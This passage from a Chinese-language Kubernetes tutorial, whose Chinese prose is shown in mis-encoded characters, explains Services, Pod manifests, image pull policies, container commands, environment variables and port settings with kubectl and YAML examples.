external-ip   port(s)   age     selector\nsvc-nginx1   clusterip   10.109.179.231   <none>        80/tcp    3m51s   run=nginx\n\n# è¿éäº§çäºä¸ä¸ªcluster-ipï¼è¿å°±æ¯serviceçipï¼å¨serviceççå½å¨æä¸­ï¼è¿ä¸ªå°åæ¯ä¸ä¼åå¨ç\n# å¯ä»¥éè¿è¿ä¸ªipè®¿é®å½åserviceå¯¹åºçpod\n[root@master ~]# curl 10.109.179.231:80\n<!doctype html>\n<html>\n<head>\n<title>welcome to nginx!</title>\n</head>\n<body>\n<h1>welcome to nginx!</h1>\n.......\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\næä½äºï¼åå»ºéç¾¤å¤é¨ä¹å¯è®¿é®ç service\nä¸é¢åå»ºç service ç type ç±»åä¸º clusteripï¼è¿ä¸ª ip å°ååªç¨éç¾¤åé¨å¯è®¿é®ï¼å¦æéè¦åå»ºå¤é¨ä¹å¯ä»¥è®¿é®ç serviceï¼éè¦ä¿®æ¹ type ä¸º nodeport\n\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx2 --type=nodeport --port=80 --target-port=80 -n dev\nservice/svc-nginx2 exposed\n\n# æ­¤æ¶æ¥çï¼ä¼åç°åºç°äºnodeportç±»åçserviceï¼èä¸æä¸å¯¹portï¼80:31928/tcï¼\n[root@master ~]# kubectl get svc  svc-nginx2  -n dev -o wide\nname          type        cluster-ip       external-ip   port(s)        age    selector\nsvc-nginx2    nodeport    10.100.94.0      <none>        80:31928/tcp   9s     run=nginx\n\n# æ¥ä¸æ¥å°±å¯ä»¥éè¿éç¾¤å¤çä¸»æºè®¿é® èç¹ip:31928è®¿é®æå¡äº\n# ä¾å¦å¨ççµèä¸»æºä¸éè¿æµè§å¨è®¿é®ä¸é¢çå°å\nhttp://192.168.5.4:31928/\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nå é¤ service\n\n[root@master ~]# kubectl delete svc svc-nginx-1 -n dev service "svc-nginx-1" deleted\n\n\n1\n\n\néç½®æ¹å¼\nåå»ºä¸ä¸ª svc-nginx.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: service\nmetadata:\n  name: svc-nginx\n  namespace: dev\nspec:\n  # åºå®svcçåç½ipï¼å¦æä¸æå®ä¼éæºåé\n  clusterip: 10.109.179.231 \n  ports:\n  - port: 80\n    protocol: tcp\n    targetport: 80\n  selector:\n    run: nginx\n  type: clusterip\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f svc-nginx.yaml\nå é¤ï¼kubectl delete -f svc-nginx.yaml',charsets:{cjk:!0}},{title:"kubernetes(äº) Pod ä»ç»åéç½®",frontmatter:{title:"kubernetes(äº) Pod ä»ç»åéç½®",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/604",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/604.kubernetes(%E4%BA%94)%20Pod%20%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE.html",relativePath:"04.è¿ç»´/60.Kubernetes/604.kubernetes(äº) Pod ä»ç»åéç½®.md",key:"v-589af7a8",path:"/kubernetes/604/",headers:[{level:2,title:"ä»ç»",slug:"ä»ç»",normalizedTitle:"ä»ç»",charIndex:2},{level:3,title:"Podç»æ",slug:"podç»æ",normalizedTitle:"pod ç»æ",charIndex:9},{level:3,title:"Podå®ä¹",slug:"podå®ä¹",normalizedTitle:"pod å®ä¹",charIndex:258},{level:2,title:"Podéç½®",slug:"podéç½®",normalizedTitle:"pod éç½®",charIndex:5169},{level:3,title:"åºæ¬éç½®",slug:"åºæ¬éç½®",normalizedTitle:"åºæ¬éç½®",charIndex:5723},{level:3,title:"éåæå",slug:"éåæå",normalizedTitle:"éåæå",charIndex:5466},{level:3,title:"å¯å¨å½ä»¤",slug:"å¯å¨å½ä»¤",normalizedTitle:"å¯å¨å½ä»¤",charIndex:714},{level:3,title:"ç¯å¢åé",slug:"ç¯å¢åé",normalizedTitle:"ç¯å¢åé",charIndex:1216},{level:3,title:"ç«¯å£è®¾ç½®",slug:"ç«¯å£è®¾ç½®",normalizedTitle:"ç«¯å£è®¾ç½®",charIndex:10966},{level:3,title:"èµæºéé¢",slug:"èµæºéé¢",normalizedTitle:"èµæºéé¢",charIndex:12205}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ä»ç» Podç»æ Podå®ä¹ Podéç½® åºæ¬éç½® éåæå å¯å¨å½ä»¤ ç¯å¢åé ç«¯å£è®¾ç½® èµæºéé¢",content:'# ä»ç»\n\n\n# Pod ç»æ\n\n\n\næ¯ä¸ª Pod ä¸­é½å¯ä»¥åå«ä¸ä¸ªæèå¤ä¸ªå®¹å¨ï¼è¿äºå®¹å¨å¯ä»¥åä¸ºä¸¤ç±»ï¼\n\n * ç¨æ·ç¨åºæå¨çå®¹å¨ï¼æ°éå¯å¤å¯å°\n * Pause å®¹å¨ï¼è¿æ¯æ¯ä¸ª Pod é½ä¼æçä¸ä¸ªæ ¹å®¹å¨ï¼å®çä½ç¨æä¸¤ä¸ªï¼\n   * å¯ä»¥ä»¥å®ä¸ºä¾æ®ï¼è¯ä¼°æ´ä¸ª Pod çå¥åº·ç¶æ\n   * å¯ä»¥å¨æ ¹å®¹å¨ä¸è®¾ç½® Ip å°åï¼å¶å®å®¹å¨é½æ­¤ Ipï¼Pod IPï¼ï¼ä»¥å®ç° Pod åé¨çç½è·¯éä¿¡\n     è¿éæ¯Podåé¨çéè®¯ï¼Podçä¹é´çéè®¯éç¨èæäºå±ç½ç»ææ¯æ¥å®ç°ï¼æä»¬å½åç¯å¢ç¨çæ¯Flannel\n\n\n# Pod å®ä¹\n\nä¸é¢æ¯ Pod çèµæºæ¸åï¼\n\napiVersion: v1     #å¿éï¼çæ¬å·ï¼ä¾å¦v1\nkind: Pod       ã #å¿éï¼èµæºç±»åï¼ä¾å¦ Pod\nmetadata:       ã #å¿éï¼åæ°æ®\n  name: string     #å¿éï¼Podåç§°\n  namespace: string  #Podæå±çå½åç©ºé´,é»è®¤ä¸º"default"\n  labels:       ãã  #èªå®ä¹æ ç­¾åè¡¨\n    - name: string      ã          \nspec:  #å¿éï¼Podä¸­å®¹å¨çè¯¦ç»å®ä¹\n  containers:  #å¿éï¼Podä¸­å®¹å¨åè¡¨\n  - name: string   #å¿éï¼å®¹å¨åç§°\n    image: string  #å¿éï¼å®¹å¨çéååç§°\n    imagePullPolicy: [ Always|Never|IfNotPresent ]  #è·åéåçç­ç¥ \n    command: [string]   #å®¹å¨çå¯å¨å½ä»¤åè¡¨ï¼å¦ä¸æå®ï¼ä½¿ç¨æåæ¶ä½¿ç¨çå¯å¨å½ä»¤\n    args: [string]      #å®¹å¨çå¯å¨å½ä»¤åæ°åè¡¨\n    workingDir: string  #å®¹å¨çå·¥ä½ç®å½\n    volumeMounts:       #æè½½å°å®¹å¨åé¨çå­å¨å·éç½®\n    - name: string      #å¼ç¨podå®ä¹çå±äº«å­å¨å·çåç§°ï¼éç¨volumes[]é¨åå®ä¹ççå·å\n      mountPath: string #å­å¨å·å¨å®¹å¨åmountçç»å¯¹è·¯å¾ï¼åºå°äº512å­ç¬¦\n      readOnly: boolean #æ¯å¦ä¸ºåªè¯»æ¨¡å¼\n    ports: #éè¦æ´é²çç«¯å£åºå·åè¡¨\n    - name: string        #ç«¯å£çåç§°\n      containerPort: int  #å®¹å¨éè¦çå¬çç«¯å£å·\n      hostPort: int       #å®¹å¨æå¨ä¸»æºéè¦çå¬çç«¯å£å·ï¼é»è®¤ä¸Containerç¸å\n      protocol: string    #ç«¯å£åè®®ï¼æ¯æTCPåUDPï¼é»è®¤TCP\n    env:   #å®¹å¨è¿è¡åéè®¾ç½®çç¯å¢åéåè¡¨\n    - name: string  #ç¯å¢åéåç§°\n      value: string #ç¯å¢åéçå¼\n    resources: #èµæºéå¶åè¯·æ±çè®¾ç½®\n      limits:  #èµæºéå¶çè®¾ç½®\n        cpu: string     #Cpuçéå¶ï¼åä½ä¸ºcoreæ°ï¼å°ç¨äºdocker run --cpu-sharesåæ°\n        memory: string  #åå­éå¶ï¼åä½å¯ä»¥ä¸ºMib/Gibï¼å°ç¨äºdocker run --memoryåæ°\n      requests: #èµæºè¯·æ±çè®¾ç½®\n        cpu: string    #Cpuè¯·æ±ï¼å®¹å¨å¯å¨çåå§å¯ç¨æ°é\n        memory: string #åå­è¯·æ±,å®¹å¨å¯å¨çåå§å¯ç¨æ°é\n    lifecycle: #çå½å¨æé©å­\n        postStart: #å®¹å¨å¯å¨åç«å³æ§è¡æ­¤é©å­,å¦ææ§è¡å¤±è´¥,ä¼æ ¹æ®éå¯ç­ç¥è¿è¡éå¯\n        preStop: #å®¹å¨ç»æ­¢åæ§è¡æ­¤é©å­,æ è®ºç»æå¦ä½,å®¹å¨é½ä¼ç»æ­¢\n    livenessProbe:  #å¯¹Podååå®¹å¨å¥åº·æ£æ¥çè®¾ç½®ï¼å½æ¢æµæ ååºå æ¬¡åå°èªå¨éå¯è¯¥å®¹å¨\n      exec:       ã #å¯¹Podå®¹å¨åæ£æ¥æ¹å¼è®¾ç½®ä¸ºexecæ¹å¼\n        command: [string]  #execæ¹å¼éè¦å¶å®çå½ä»¤æèæ¬\n      httpGet:       #å¯¹Podåä¸ªå®¹å¨å¥åº·æ£æ¥æ¹æ³è®¾ç½®ä¸ºHttpGetï¼éè¦å¶å®Pathãport\n        path: string\n        port: number\n        host: string\n        scheme: string\n        HttpHeaders:\n        - name: string\n          value: string\n      tcpSocket:     #å¯¹Podåä¸ªå®¹å¨å¥åº·æ£æ¥æ¹å¼è®¾ç½®ä¸ºtcpSocketæ¹å¼\n         port: number\n       initialDelaySeconds: 0       #å®¹å¨å¯å¨å®æåé¦æ¬¡æ¢æµçæ¶é´ï¼åä½ä¸ºç§\n       timeoutSeconds: 0    ãã    #å¯¹å®¹å¨å¥åº·æ£æ¥æ¢æµç­å¾ååºçè¶æ¶æ¶é´ï¼åä½ç§ï¼é»è®¤1ç§\n       periodSeconds: 0     ãã    #å¯¹å®¹å¨çæ§æ£æ¥çå®ææ¢æµæ¶é´è®¾ç½®ï¼åä½ç§ï¼é»è®¤10ç§ä¸æ¬¡\n       successThreshold: 0\n       failureThreshold: 0\n       securityContext:\n         privileged: false\n  restartPolicy: [Always | Never | OnFailure]  #Podçéå¯ç­ç¥\n  nodeName: <string> #è®¾ç½®NodeNameè¡¨ç¤ºå°è¯¥Podè°åº¦å°æå®å°åç§°çnodeèç¹ä¸\n  nodeSelector: obeject #è®¾ç½®NodeSelectorè¡¨ç¤ºå°è¯¥Podè°åº¦å°åå«è¿ä¸ªlabelçnodeä¸\n  imagePullSecrets: #Pulléåæ¶ä½¿ç¨çsecretåç§°ï¼ä»¥keyï¼secretkeyæ ¼å¼æå®\n  - name: string\n  hostNetwork: false   #æ¯å¦ä½¿ç¨ä¸»æºç½ç»æ¨¡å¼ï¼é»è®¤ä¸ºfalseï¼å¦æè®¾ç½®ä¸ºtrueï¼è¡¨ç¤ºä½¿ç¨å®¿ä¸»æºç½ç»\n  volumes:   #å¨è¯¥podä¸å®ä¹å±äº«å­å¨å·åè¡¨\n  - name: string    #å±äº«å­å¨å·åç§° ï¼volumesç±»åæå¾å¤ç§ï¼\n    emptyDir: {}       #ç±»åä¸ºemtyDirçå­å¨å·ï¼ä¸Podåçå½å¨æçä¸ä¸ªä¸´æ¶ç®å½ãä¸ºç©ºå¼\n    hostPath: string   #ç±»åä¸ºhostPathçå­å¨å·ï¼è¡¨ç¤ºæè½½Podæå¨å®¿ä¸»æºçç®å½\n      path: string      ãã        #Podæå¨å®¿ä¸»æºçç®å½ï¼å°è¢«ç¨äºåæä¸­mountçç®å½\n    secret:       ããã#ç±»åä¸ºsecretçå­å¨å·ï¼æè½½éç¾¤ä¸å®ä¹çsecretå¯¹è±¡å°å®¹å¨åé¨\n      scretname: string  \n      items:     \n      - key: string\n        path: string\n    configMap:         #ç±»åä¸ºconfigMapçå­å¨å·ï¼æè½½é¢å®ä¹çconfigMapå¯¹è±¡å°å®¹å¨åé¨\n      name: string\n      items:\n      - key: string\n        path: string\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n\n\nä¸ç¥éç¸å³ç type æä»ä¹èµæºç±»åå¯åï¼å¯ä»¥éè¿ä¸ä¸ªå½ä»¤æ¥æ¥çæ¯ç§èµæºçå¯éç½®é¡¹\n\n#   kubectl explain èµæºç±»å         æ¥çæç§èµæºå¯ä»¥éç½®çä¸çº§å±æ§\n#   kubectl explain èµæºç±»å.å±æ§     æ¥çå±æ§çå­å±æ§\n[root@k8s-master01 ~]# kubectl explain pod\nKIND:     Pod\nVERSION:  v1\nFIELDS:\n   apiVersion   <string>\n   kind <string>\n   metadata     <Object>\n   spec <Object>\n   status       <Object>\n\n[root@k8s-master01 ~]# kubectl explain pod.metadata\nKIND:     Pod\nVERSION:  v1\nRESOURCE: metadata <Object>\nFIELDS:\n   annotations  <map[string]string>\n   clusterName  <string>\n   creationTimestamp    <string>\n   deletionGracePeriodSeconds   <integer>\n   deletionTimestamp    <string>\n   finalizers   <[]string>\n   generateName <string>\n   generation   <integer>\n   labels       <map[string]string>\n   managedFields        <[]Object>\n   name <string>\n   namespace    <string>\n   ownerReferences      <[]Object>\n   resourceVersion      <string>\n   selfLink     <string>\n   uid  <string>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\nå¨ kubernetes ä¸­åºæ¬ææèµæºçä¸çº§å±æ§é½æ¯ä¸æ ·çï¼ä¸»è¦åå« 5 é¨åï¼\n\n * apiVersion çæ¬ï¼ç± kubernetes åé¨å®ä¹ï¼çæ¬å·å¿é¡»å¯ä»¥ç¨ kubectl api-versions æ¥è¯¢å°\n * kind ç±»åï¼ç± kubernetes åé¨å®ä¹ï¼çæ¬å·å¿é¡»å¯ä»¥ç¨ kubectl api-resources æ¥è¯¢å°\n * metadata åæ°æ®ï¼ä¸»è¦æ¯èµæºæ è¯åè¯´æï¼å¸¸ç¨çæ nameãnamespaceãlabels ç­\n * spec æè¿°ï¼è¿æ¯éç½®ä¸­æéè¦çä¸é¨åï¼éé¢æ¯å¯¹åç§èµæºéç½®çè¯¦ç»æè¿°\n * status ç¶æä¿¡æ¯ï¼éé¢çåå®¹ä¸éè¦å®ä¹ï¼ç± kubernetes èªå¨çæ\n\nå¨ä¸é¢çå±æ§ä¸­ï¼spec æ¯æ¥ä¸æ¥ç ç©¶çéç¹ï¼ç»§ç»­çä¸å®çå¸¸è§å­å±æ§:\n\n * containers <[] Object> å®¹å¨åè¡¨ï¼ç¨äºå®ä¹å®¹å¨çè¯¦ç»ä¿¡æ¯\n * nodeName æ ¹æ® nodeName çå¼å° pod è°åº¦å°æå®ç Node èç¹ä¸\n * nodeSelector <map []> æ ¹æ® NodeSelector ä¸­å®ä¹çä¿¡æ¯éæ©å°è¯¥ Pod è°åº¦å°åå«è¿äº label ç Node ä¸\n * hostNetwork æ¯å¦ä½¿ç¨ä¸»æºç½ç»æ¨¡å¼ï¼é»è®¤ä¸º falseï¼å¦æè®¾ç½®ä¸º trueï¼è¡¨ç¤ºä½¿ç¨å®¿ä¸»æºç½ç»\n * volumes <[] Object> å­å¨å·ï¼ç¨äºå®ä¹ Pod ä¸é¢æå¨çå­å¨ä¿¡æ¯\n * restartPolicy éå¯ç­ç¥ï¼è¡¨ç¤º Pod å¨éå°æéçæ¶åçå¤çç­ç¥\n\n\n# Pod éç½®\n\nä¸»è¦æ¥ç ç©¶ pod.spec.containers å±æ§ï¼è¿ä¹æ¯ pod éç½®ä¸­æä¸ºå³é®çä¸é¡¹éç½®ã\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers\nKIND:     Pod\nVERSION:  v1\nRESOURCE: containers <[]Object>   # æ°ç»ï¼ä»£è¡¨å¯ä»¥æå¤ä¸ªå®¹å¨\nFIELDS:\n   name  <string>     # å®¹å¨åç§°\n   image <string>     # å®¹å¨éè¦çéåå°å\n   imagePullPolicy  <string> # éåæåç­ç¥ \n   command  <[]string> # å®¹å¨çå¯å¨å½ä»¤åè¡¨ï¼å¦ä¸æå®ï¼ä½¿ç¨æåæ¶ä½¿ç¨çå¯å¨å½ä»¤\n   args     <[]string> # å®¹å¨çå¯å¨å½ä»¤éè¦çåæ°åè¡¨\n   env      <[]Object> # å®¹å¨ç¯å¢åéçéç½®\n   ports    <[]Object>     # å®¹å¨éè¦æ´é²çç«¯å£å·åè¡¨\n   resources <Object>      # èµæºéå¶åèµæºè¯·æ±çè®¾ç½®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# åºæ¬éç½®\n\nåå»º pod-base.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-base\n  namespace: dev\n  labels:\n    user: heima\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nä¸é¢å®ä¹äºä¸ä¸ªæ¯è¾ç®å Pod çéç½®ï¼éé¢æä¸¤ä¸ªå®¹å¨ï¼\n\n * nginxï¼ç¨ 1.17.1 çæ¬ç nginx éååå»ºï¼ï¼nginx æ¯ä¸ä¸ªè½»éçº§ web å®¹å¨ï¼\n * busyboxï¼ç¨ 1.30 çæ¬ç busybox éååå»ºï¼ï¼busybox æ¯ä¸ä¸ªå°å·§ç linux å½ä»¤éåï¼\n\n# åå»ºPod\n[root@k8s-master01 pod]# kubectl apply -f pod-base.yaml\npod/pod-base created\n\n# æ¥çPodç¶åµ\n# READY 1/2 : è¡¨ç¤ºå½åPodä¸­æ2ä¸ªå®¹å¨ï¼å¶ä¸­1ä¸ªåå¤å°±ç»ªï¼1ä¸ªæªå°±ç»ª\n# RESTARTS  : éå¯æ¬¡æ°ï¼å ä¸ºæ1ä¸ªå®¹å¨æéäºï¼Podä¸ç´å¨éå¯è¯å¾æ¢å¤å®\n[root@k8s-master01 pod]# kubectl get pod -n dev\nNAME       READY   STATUS    RESTARTS   AGE\npod-base   1/2     Running   4          95s\n\n# å¯ä»¥éè¿describeæ¥çåé¨çè¯¦æ\n# æ­¤æ¶å·²ç»è¿è¡èµ·æ¥äºä¸ä¸ªåºæ¬çPodï¼æä»¥å®ææ¶æé®é¢\n[root@k8s-master01 pod]# kubectl describe pod pod-base -n dev\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# éåæå\n\nå½æä»¬ç Pod å·²ç»æåéåå¹¶å¯å¨å®¹å¨ï¼å¶ä» Pod ä¹éè¦æ­¤éåï¼é£ä¹æ­¤æ¶å¶ä» Pod æåç¸åéåæ¯ä»éåæºæåï¼è¿æ¯ç´æ¥ä½¿ç¨å·²ç»æåè¿çéåï¼è¿å°±ç± imagepullpolicy æ¥å³å®ã\n\nåå»º pod-imagepullpolicy.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-imagepullpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    imagePullPolicy: Never # ç¨äºè®¾ç½®éåæåç­ç¥\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nimagePullPolicyï¼ç¨äºè®¾ç½®éåæåç­ç¥ï¼kubernetes æ¯æéç½®ä¸ç§æåç­ç¥ï¼\n\n * Alwaysï¼æ»æ¯ä»è¿ç¨ä»åºæåéåï¼ä¸ç´è¿ç¨ä¸è½½ï¼\n * IfNotPresentï¼æ¬å°æåä½¿ç¨æ¬å°éåï¼æ¬å°æ²¡æåä»è¿ç¨ä»åºæåéåï¼æ¬å°æå°±æ¬å° æ¬å°æ²¡è¿ç¨ä¸è½½ï¼\n * Neverï¼åªä½¿ç¨æ¬å°éåï¼ä»ä¸å»è¿ç¨ä»åºæåï¼æ¬å°æ²¡æå°±æ¥é ï¼ä¸ç´ä½¿ç¨æ¬å°ï¼\n\n> é»è®¤å¼è¯´æ:\n> å¦æéå tag ä¸ºå·ä½çæ¬å·ï¼ é»è®¤ç­ç¥æ¯ï¼IfNotPresent\n> å¦æéå tag ä¸ºï¼latestï¼æç»çæ¬ï¼ ï¼é»è®¤ç­ç¥æ¯ always\n\n# åå»ºPod\n[root@k8s-master01 pod]# kubectl create -f pod-imagepullpolicy.yaml\npod/pod-imagepullpolicy created\n\n# æ¥çPodè¯¦æ\n# æ­¤æ¶ææ¾å¯ä»¥çå°nginxéåæä¸æ­¥Pulling image "nginx:1.17.1"çè¿ç¨\n[root@k8s-master01 pod]# kubectl describe pod pod-imagepullpolicy -n dev\n......\nEvents:\n  Type     Reason     Age               From               Message\n  ----     ------     ----              ----               -------\n  Normal   Scheduled  <unknown>         default-scheduler  Successfully assigned dev/pod-imagePullPolicy to node1\n  Normal   Pulling    32s               kubelet, node1     Pulling image "nginx:1.17.1"\n  Normal   Pulled     26s               kubelet, node1     Successfully pulled image "nginx:1.17.1"\n  Normal   Created    26s               kubelet, node1     Created container nginx\n  Normal   Started    25s               kubelet, node1     Started container nginx\n  Normal   Pulled     7s (x3 over 25s)  kubelet, node1     Container image "busybox:1.30" already present on machine\n  Normal   Created    7s (x3 over 25s)  kubelet, node1     Created container busybox\n  Normal   Started    7s (x3 over 25s)  kubelet, node1     Started container busybox\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# å¯å¨å½ä»¤\n\nå¨ åºæ¬éç½® çæ¡ä¾ä¸­ï¼æä¸ä¸ªé®é¢æ²¡æè§£å³ï¼å°±æ¯ busybox å®¹å¨ä¸ç´æ²¡ææåè¿è¡ï¼é£ä¹å°åºæ¯ä»ä¹åå å¯¼è´è¿ä¸ªå®¹å¨çæéå¢ï¼\n\nbusybox å¹¶ä¸æ¯ä¸ä¸ªç¨åºï¼èæ¯ç±»ä¼¼äºä¸ä¸ªå·¥å·ç±»çéåï¼kubernetes éç¾¤å¯å¨ç®¡çåï¼å®ä¼èªå¨å³é­ãè§£å³æ¹æ³å°±æ¯è®©å¶ä¸ç´å¨è¿è¡ï¼è¿å°±ç¨å°äº command éç½®ã\n\nåå»º pod-command.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-command\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n    # å®¹å¨å¯å¨æåï¼æ§è¡æ­»å¾ªç¯\n    command: ["/bin/sh","-c","touch /tmp/hello.txt;while true;do /bin/echo $(date +%T) >> /tmp/hello.txt; sleep 3; done;"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\ncommandï¼ç¨äºå¨ pod ä¸­çå®¹å¨åå§åå®æ¯ä¹åè¿è¡ä¸ä¸ªå½ä»¤ã\n\n> ç¨å¾®è§£éä¸ä¸é¢å½ä»¤çææï¼\n> "/bin/sh","-c", ä½¿ç¨ sh æ§è¡å½ä»¤\n> touch /tmp/hello.txt; åå»ºä¸ä¸ª /tmp/hello.txt æä»¶\n> while true;do /bin/echo $(date +% T) >> /tmp/hello.txt; sleep 3; done; æ¯é 3 ç§åæä»¶ä¸­åå¥å½åæ¶é´\n\n# åå»ºPod\n[root@k8s-master01 pod]# kubectl create  -f pod-command.yaml\npod/pod-command created\n\n# æ¥çPodç¶æ\n# æ­¤æ¶åç°ä¸¤ä¸ªpodé½æ­£å¸¸è¿è¡äº\n[root@k8s-master01 pod]# kubectl get pods pod-command -n dev\nNAME          READY   STATUS   RESTARTS   AGE\npod-command   2/2     Runing   0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nè¿å¥ pod ä¸­ç busybox å®¹å¨ï¼æ¥çæä»¶åå®¹ï¼å½ä»¤å¦ä¸\n\nkubectl exec  podåç§° -n å½åç©ºé´ -it -c å®¹å¨åç§° /bin/sh\n\n\n1\n\n\nä½¿ç¨è¿ä¸ªå½ä»¤å°±å¯ä»¥è¿å¥æä¸ªå®¹å¨çåé¨ï¼ç¶åè¿è¡ç¸å³æä½äºï¼æ¯å¦ï¼å¯ä»¥æ¥ç txt æä»¶çåå®¹ãæ¼ç¤ºï¼\n\n[root@k8s-master01 pod]# kubectl exec pod-command -n dev -it -c busybox /bin/sh\n/ # tail -f /tmp/hello.txt\n14:44:19\n14:44:22\n14:44:25\n\n\n1\n2\n3\n4\n5\n\n\n> ç¹å«è¯´æï¼\n> éè¿ä¸é¢åç° command å·²ç»å¯ä»¥å®æå¯å¨å½ä»¤åä¼ éåæ°çåè½ï¼ä¸ºä»ä¹è¿éè¿è¦æä¾ä¸ä¸ª args éé¡¹ï¼ç¨äºä¼ éåæ°å¢ï¼è¿å¶å®è· docker æç¹å³ç³»ï¼kubernetes ä¸­ç commandãargs ä¸¤é¡¹å¶å®æ¯å®ç°è¦ç Dockerfile ä¸­ ENTRYPOINT çåè½ã\n> 1 å¦æ command å args åæ²¡æåï¼é£ä¹ç¨ Dockerfile çéç½®ã\n> 2 å¦æ command åäºï¼ä½ args æ²¡æåï¼é£ä¹ Dockerfile é»è®¤çéç½®ä¼è¢«å¿½ç¥ï¼æ§è¡è¾å¥ç command\n> 3 å¦æ command æ²¡åï¼ä½ args åäºï¼é£ä¹ Dockerfile ä¸­éç½®ç ENTRYPOINT çå½ä»¤ä¼è¢«æ§è¡ï¼ä½¿ç¨å½å args çåæ°\n> 4 å¦æ command å args é½åäºï¼é£ä¹ Dockerfile çéç½®è¢«å¿½ç¥ï¼æ§è¡ command å¹¶è¿½å ä¸ args åæ°\n\n\n# ç¯å¢åé\n\nåå»º pod-env.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-env\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do /bin/echo $(date +%T);sleep 60; done;"]\n    env: # è®¾ç½®ç¯å¢åéåè¡¨\n    - name: "username"\n      value: "admin"\n    - name: "password"\n      value: "123456"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nenvï¼ç¯å¢åéï¼ç¨äºå¨ pod ä¸­çå®¹å¨è®¾ç½®ç¯å¢åéã\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-env.yaml\npod/pod-env created\n\n# è¿å¥å®¹å¨ï¼è¾åºç¯å¢åé\n[root@k8s-master01 ~]# kubectl exec pod-env -n dev -c busybox -it /bin/sh\n/ # echo $username\nadmin\n/ # echo $password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nè¿ç§æ¹å¼ä¸æ¯å¾æ¨èï¼æ¨èå°è¿äºéç½®åç¬å­å¨å¨éç½®æä»¶ä¸­ï¼è¿ç§æ¹å¼å°å¨åé¢ä»ç»ã\n\n\n# ç«¯å£è®¾ç½®\n\næ¬å°èæ¥ä»ç»å®¹å¨çç«¯å£è®¾ç½®ï¼ä¹å°±æ¯ containers ç ports éé¡¹ã\n\né¦åçä¸ ports æ¯æçå­éé¡¹ï¼\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.ports\nKIND:     Pod\nVERSION:  v1\nRESOURCE: ports <[]Object>\nFIELDS:\n   name         <string>  # ç«¯å£åç§°ï¼å¦ææå®ï¼å¿é¡»ä¿è¯nameå¨podä¸­æ¯å¯ä¸ç\t\t\n   containerPort<integer> # å®¹å¨è¦çå¬çç«¯å£(0<x<65536)\n   hostPort     <integer> # å®¹å¨è¦å¨ä¸»æºä¸å¬å¼çç«¯å£ï¼å¦æè®¾ç½®ï¼ä¸»æºä¸åªè½è¿è¡å®¹å¨çä¸ä¸ªå¯æ¬(ä¸è¬çç¥) \n   hostIP       <string>  # è¦å°å¤é¨ç«¯å£ç»å®å°çä¸»æºIP(ä¸è¬çç¥)\n   protocol     <string>  # ç«¯å£åè®®ãå¿é¡»æ¯UDPãTCPæSCTPãé»è®¤ä¸ºâTCPâã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\næ¥ä¸æ¥ï¼ç¼åä¸ä¸ªæµè¯æ¡ä¾ï¼åå»º pod-ports.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-ports\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: # è®¾ç½®å®¹å¨æ´é²çç«¯å£åè¡¨\n    